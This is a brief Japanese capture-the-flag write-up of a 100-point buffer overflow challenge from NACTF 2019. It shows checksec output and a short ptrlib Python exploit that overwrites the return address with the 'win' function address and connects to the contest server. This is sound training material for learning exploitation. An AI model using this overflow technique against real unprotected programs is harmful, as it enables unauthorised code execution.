# [pwn 100pts] BufferOverflow #0 - Network Academia CTF 2019
32ビットバイナリで、全部無効です。
```
$ checksec -f bufover-0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RW-RUNPATH   72 Symbols     No       0               6       bufover-0
```

ret2winするだけです。
```python
from ptrlib import *

elf = ELF("./bufover-0")
#sock = Process("./bufover-0")
sock = Socket("shell.2019.nactf.com", 31475)
payload = b'A' * 0x1c
payload += p32(elf.symbol("win"))
sock.sendlineafter(">", payload)

sock.interactive()
```

# 感想
簡単ですね。
